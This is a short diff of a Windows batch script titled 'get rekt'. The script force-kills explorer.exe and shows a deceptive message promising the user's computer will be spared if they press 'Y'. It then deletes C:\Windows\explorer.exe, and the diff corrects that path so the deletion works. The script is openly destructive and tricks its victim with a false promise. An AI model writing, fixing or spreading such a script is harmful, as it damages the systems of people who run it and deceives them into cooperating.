@@ -12,7 +12,7 @@ title get rekt
 taskkill /f /im explorer.exe
 echo If you help me, i will not render your computer useless. You can help me by pressing "Y"
 pause
-del C:/Windows/explorer.exe
+del C:\Windows/explorer.exe
 echo Thanks for helping me. 
 title Thanks
 pause 
